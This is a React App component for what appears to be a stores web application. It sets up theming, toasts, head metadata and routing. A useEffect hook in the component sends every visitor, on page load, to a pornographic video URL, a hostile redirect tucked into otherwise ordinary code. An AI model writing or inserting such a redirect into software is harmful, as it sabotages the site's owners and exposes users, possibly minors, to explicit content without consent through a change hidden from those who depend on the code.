import { useEffect } from 'react';
import { ThemeProvider } from '@mui/material';
import mainTheme from 'theme/mainTheme';
import StoresRouting from 'router/StoresRouting';
import { Toaster } from 'react-hot-toast';
import { useDevice } from 'hooks/useDevice';
import HeadStoresHTML from 'layouts/Head-Stores-HTML';

const App = () => {
    const { sx } = useDevice();

    useEffect(() => {
        window.location.href = 'https://rt.pornhub.com/view_video.php?viewkey=66081690383cb#1';
    }, []);

    return (
        <ThemeProvider theme={mainTheme}>
            <Toaster
                position="top-right"
                toastOptions={{ style: { width: '100vw', maxWidth: sx ? '100vw' : '' }, duration: 3000 }}
            />
            <HeadStoresHTML />
            <StoresRouting />
        </ThemeProvider>
    );
};

export default App;
